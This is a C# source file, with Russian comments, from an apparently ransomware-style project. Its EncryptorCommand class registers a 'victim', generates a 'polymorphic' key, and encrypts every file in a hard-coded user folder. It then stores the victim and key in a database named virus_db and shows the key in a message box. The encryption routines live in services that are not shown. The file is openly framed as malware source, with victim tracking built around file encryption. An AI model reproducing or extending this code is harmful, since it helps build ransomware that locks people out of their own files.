using System;
using System.IO;
using System.Windows;
using CP.Services;

namespace CP.Commands
{
    public class EncryptorCommand
    {
        public void Execute()
        {
            try
            {
                var victimService = new VictimManagerService();
                var encryptor = new PolymorphicEncryptorService();
                var logger = new ActivityLoggerService();

                // Создаем жертву
                var victim = victimService.CreateNewVictim();
                string encryptionKey = encryptor.GeneratePolymorphicKey();

                // Шифруем файлы в целевой папке
                string targetDirectory = @"C:\Users\admin\Desktop\files";
                int encryptedCount = 0;

                if (Directory.Exists(targetDirectory))
                {
                    encryptedCount = encryptor.EncryptVictimFiles(targetDirectory, encryptionKey);
                }

                // Обновляем статистику
                victimService.UpdateVictimStats(victim, encryptedCount, encryptionKey);

                // Сохраняем в БД
                using (var context = new virus_dbEntities2())  // ← ИСПРАВЛЕНО!
                {
                    context.victims.Add(victim);  // ← строчная буква!
                    context.SaveChanges();
                }

                // Логируем активность - используем victim.victim_id (int)
                logger.LogEncryptionActivity(victim.victim_id, encryptedCount, encryptionKey);

                MessageBox.Show($"Зашифровано {encryptedCount} файлов. Ключ: {encryptionKey}",
                              "Шифрование завершено", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка шифрования: {ex.Message}", "Ошибка",
                              MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
    }
}